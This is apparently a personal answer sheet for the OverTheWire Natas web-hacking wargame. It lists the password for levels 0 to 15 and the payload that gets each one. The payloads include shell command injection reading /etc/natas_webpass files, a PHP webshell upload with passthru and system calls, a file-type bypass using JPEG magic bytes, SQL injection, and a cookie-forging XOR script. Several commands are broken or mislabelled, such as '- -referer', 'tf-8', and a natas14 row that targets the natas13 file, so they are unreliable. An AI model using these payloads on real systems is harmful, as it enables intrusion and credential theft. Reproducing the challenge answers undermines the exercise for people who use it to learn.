# [Over The Wire](https://overthewire.org/wargames/)
## [Natas](https://overthewire.org/wargames/natas/)

| Username  |  Password | How to get the password  |
| ------------ | ------------ | ------------ |
|natas0|natas0|`From the website`|
|natas1|gtVrDuiDfck831PqWsLEZy5gyDz1clto|`view page source`|
|natas2|ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi|`view page source`|
|natas3|sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14|`/files/users.txt`|
|natas4|Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ|`/s3cr3t/users.txt`|
|natas5|iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq|`curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ - -referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/`|
|natas6|aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1|`edit cookie value from 0 to 1 (use editthiscookie ext)`|
|natas7|7z3hEENjQtflzgnT29q7wAvMNfZdh0i9|`find the secret in /index-source.html`|
|natas8|DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe|`index.php?page=/etc/natas_webpass/natas8`|
|natas9|W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl|`get encoded secret from source code; base64 -d <<< reverse(hex2bin(secret)) > webpage feild and the password pops out`|
|natas10|nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu|`; cat /etc/natas_webpass/natas10`| 
|natas11|U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK|`^ /etc/natas_webpass/natas11`|
|natas12|EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3|`python3 -c \'import base64;key =[c ^ m for c, m in zip(base64.decodebytes(b"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="),b\'{"showpassword":"no","bgcolor":"#ffffff"}\')];key.append(119);print(base64.encodebytes("".join(chr(c ^ m) for c, m in zip(b\'{"showpassword":"yes","bgcolor":"#ffffff"}\',key)).encode("tf-8")))\'`|
|natas13|jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY|`inspect page; edit uploaded file's extention from jpg to php; upload this code in php file and execute it <?php echo passthru("cat /etc/natas_webpass/natas13"); OR echo exec("cat /etc/natas_webpass/natas13"); OR echo system("cat /etc/natas_webpass/natas13");?>`|
|natas14|Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1|`inspect page; edit uploaded file's extention from jpg to php; add jpg magic bit using hexeditor to code file and upload this code in jpg file and execute it FF D8 FF DB < ?php echo passthru("cat /etc/natas_webpass/natas13");`|
|natas15|AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J|`insert " OR username="natas15";# into username feild`|
|natas16|   |` `|
